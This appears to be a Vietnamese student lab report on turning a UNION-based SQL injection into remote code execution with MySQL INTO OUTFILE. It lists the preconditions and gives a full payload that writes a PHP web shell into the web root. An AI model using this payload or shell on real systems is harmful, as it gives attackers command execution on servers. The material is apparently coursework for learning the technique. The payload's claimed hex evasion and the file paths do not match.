# Task 5: Báo Cáo Khai Thác RCE Kỹ Thuật Đọc/Ghi File Qua MySQL `INTO OUTFILE`

## 1. Phân Tích Điều Kiện
SQLi `INTO OUTFILE` đặc biệt phụ thuộc nghiêm ngặt vào các biến Hệ Điều Hành MYSQL. Do file script/vulnerability thường là UNION-Based SQL Injection, Web server sẽ ném cho DB lệnh `SELECT ... INTO OUTFILE ...`
Mục tiêu là chèn nội dung dạng `<?php system($_GET['cmd']); ?>` ra một file PHP trong Web Root.

Nhưng theo như em tìm hiểu thì cần phải có 3 điều kiện:
1. User Database kết nối phải có quyền `FILE`
2. Đường dẫn xuất file phải cho phép Database ghi vào (VD: /var/www/html/uploads)
3. Biến đặc biệt `secure_file_priv` phải đang để trống `""` thay vì cấu hình khoá cứng (NULL/Directory_Cụ_Thể).


## 2. Ghi Shell Qua UNION SELECT
Bằng cách sử dụng Web interface (bị lỗi `$id = $_GET['id']` - Union), chúng ta tìm được số lượng column (bằng `ORDER BY 3`), sau đó lợi dụng phép Select tạo ra một dòng kết quả giả tự phát để lưu ra đĩa cứng MySQL:

**Payload Thiết Kế Vượt Rào Filter Bằng Cơ Chế Hex/String:**
```sql
?id=1' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3 INTO OUTFILE '/var/www/html/uploads/shell.php' -- -
```

-  Tạo thành String hợp lệ. Câu Execute: `SELECT ... id='1' UNION SELECT ... INTO OUTFILE '/var/www/html/shell.php' -- -'`
- Cột số (1) điền giả vào ô `id`. Cột text (PHP_Shell) gán vào ổ `name` giả. Cột số (3) gán ổ `description`.
- Khi chèn vào đĩa cứng MySQL (`mysqld` daemon), file tạo ra nhận string:
  `1    <?php system($_GET["cmd"]); ?>   3`. File này sau khi parse từ Extension `.php` bởi (Nginx/Apache), Cột 1 và 3 chỉ đơn thuần là string `1    3`, Nhưng cột giữa sẽ ném lệnh command sang hệ thống OS!

